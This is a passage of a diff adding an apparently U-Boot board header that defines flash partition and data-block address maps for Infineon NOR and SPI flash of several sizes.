+        "part2_begin=0xB00A0000\0"                                      \
+        "total_part=3\0"
+
+#ifdef CONFIG_OVERLAY
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_OVERLAY_IMAGE_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block6=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block7=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"      \
+        "data_block8=" IFX_CFG_FLASH_CALIBRATION_CFG_BLOCK_NAME "\0"    \
+        "total_db=9\0"
+#else
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"      \
+        "data_block7=" IFX_CFG_FLASH_CALIBRATION_CFG_BLOCK_NAME "\0"    \
+        "total_db=8\0"
+#endif
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0xB0000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0xB0020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0xB00A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+#ifdef CONFIG_OVERLAY
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0xB078FFFF
+#else
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0xB07DFFFF
+#endif
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_OVERLAY_IMAGE_BLOCK_NAME          "overlay"
+  #define IFX_CFG_FLASH_OVERLAY_IMAGE_START_ADDR          0xB0790000
+  #define IFX_CFG_FLASH_OVERLAY_IMAGE_SIZE                0x50000
+  #define IFX_CFG_FLASH_OVERLAY_IMAGE_END_ADDR            0xB07DFFFF
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0xB07E0000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0xB07EFFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0xB07F0000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0xB07F0FFF
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME          "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR          0xB07F1000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE                0x1000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR            0xB07F1FFF
+  
+  #define IFX_CFG_FLASH_CALIBRATION_CFG_BLOCK_NAME	      "calibration"
+	#define IFX_CFG_FLASH_CALIBRATION_CFG_START_ADDR	      0xB07F2000
+	#define IFX_CFG_FLASH_CALIBRATION_CFG_SIZE		          0x1000
+	#define IFX_CFG_FLASH_CALIBRATION_CFG_END_ADDR		      0xB07F2FFF  
+
+  #define IFX_CFG_FLASH_END_ADDR                          0xB07FFFFF
+
+
+#else
+  #error "ERROR!! Define flash size first!"
+#endif
+
+#endif /*CONFIG_FIRMWARE_IN_ROOTFS*/
+
+
+#endif /*CONFIG_BOOT_FROM_NOR*/
+
+/***************************************************************************/
+/***************************************************************************/
+/***************SPI FLASH map starts here***********************************/
+/***************************************************************************/
+/***************************************************************************/
+
+#ifdef CONFIG_BOOT_FROM_SPI
+
+#ifdef CONFIG_SPI_FLASH_1M
+#define IFX_CONFIG_FLASH_SIZE 1
+#elif CONFIG_SPI_FLASH_2M
+#define IFX_CONFIG_FLASH_SIZE 2
+#elif CONFIG_SPI_FLASH_4M
+#define IFX_CONFIG_FLASH_SIZE 4
+#elif CONFIG_SPI_FLASH_8M
+#define IFX_CONFIG_FLASH_SIZE 8
+#endif
+
+#ifndef IFX_CONFIG_FLASH_SIZE
+#define IFX_CONFIG_FLASH_SIZE 4
+#endif
+
+#ifdef CONFIG_FIRMWARE_IN_ROOTFS
+//1MB flash partition
+#if (IFX_CONFIG_FLASH_SIZE == 1)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00020000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block5=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"  \
+  "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0x00020000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0x000F5FFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0x000F6000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x8000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0x001FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0x000FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0x000FEFFF
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME        "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR        0x000FFE00
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE              0x0200
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR          0x000FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0x000FFFFF
+//2MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 2)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block5=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"  \
+  "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0x00010000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0x001F5FFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0x001F6000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x8000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0x001FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0x001FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0x001FEFFF
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME        "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR        0x001FFE00
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE              0x0200
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR          0x001FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0x001FFFFF
+
+//4MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 4)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"      \
+        "data_block6=" IFX_CFG_FLASH_CALIBRATION_CFG_BLOCK_NAME "\0"    \
+        "total_db=7\0"
+        
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME           "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR           0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME          "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR          0x00010000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock1"
+
+ #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x003DFFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x003E0000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x003EFFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x003F0000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x003F0FFF
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME          "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR          0x003F1000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE                0x1000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR            0x003F1FFF
+  
+  #define IFX_CFG_FLASH_CALIBRATION_CFG_BLOCK_NAME	      "calibration"
+	#define IFX_CFG_FLASH_CALIBRATION_CFG_START_ADDR	      0x003F2000
+	#define IFX_CFG_FLASH_CALIBRATION_CFG_SIZE		          0x1000
+	#define IFX_CFG_FLASH_CALIBRATION_CFG_END_ADDR		      0x003F2FFF  
+
+  #define IFX_CFG_FLASH_END_ADDR                         0x003FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 8)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00020000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"      \
+        "data_block6=" IFX_CFG_FLASH_CALIBRATION_CFG_BLOCK_NAME "\0"    \
+        "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x00020000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x007DFFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x007E0000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x007EFFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x007F0000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x007F0FFF
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME          "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR          0x007F1000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE                0x1000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR            0x007F1FFF
+  
+  #define IFX_CFG_FLASH_CALIBRATION_CFG_BLOCK_NAME	      "calibration"
+	#define IFX_CFG_FLASH_CALIBRATION_CFG_START_ADDR	      0x007F2000
+	#define IFX_CFG_FLASH_CALIBRATION_CFG_SIZE		          0x1000
+	#define IFX_CFG_FLASH_CALIBRATION_CFG_END_ADDR		      0x007F2FFF  
+
+  #define IFX_CFG_FLASH_END_ADDR                          0x007FFFFF
+  
+#else
+  #error "ERROR!! Define flash size first!"
+#endif
+
+#else /*Not defined CONFIG_FIRMWARE_IN_ROOTFS*/
+#if (IFX_CONFIG_FLASH_SIZE == 1)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00020000\0"                                      \
+        "part2_begin=0x000A0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block6=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"  \
+  "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME       "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR       0x00020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE             0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME    "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0x000A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0x000F5FFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0x000F6000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x8000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0x000FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0x000FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0x000FEFFF
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME        "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR        0x000FFE00
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE              0x0200
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR          0x000FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0x000FFFFF
+
+//2MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 2)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00020000\0"                                      \
+        "part2_begin=0x000A0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block6=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"  \
+  "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME       "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR       0x00020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE             0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME    "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0x000A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0x001F5FFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0x001F6000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x8000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0x001FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0x001FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0x001FEFFF
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME        "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR        0x001FFE00
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE              0x0200
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR          0x001FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0x001FFFFF
+
+//4MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 4)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00020000\0"                                      \
+        "part2_begin=0x000A0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"      \
+        "data_block7=" IFX_CFG_FLASH_CALIBRATION_CFG_BLOCK_NAME "\0"    \
+        "total_db=8\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME           "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR           0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME        "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR        0x00020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE              0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME     "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME          "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR          0x000A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x003DFFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x003E0000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x003EFFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x003F0000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
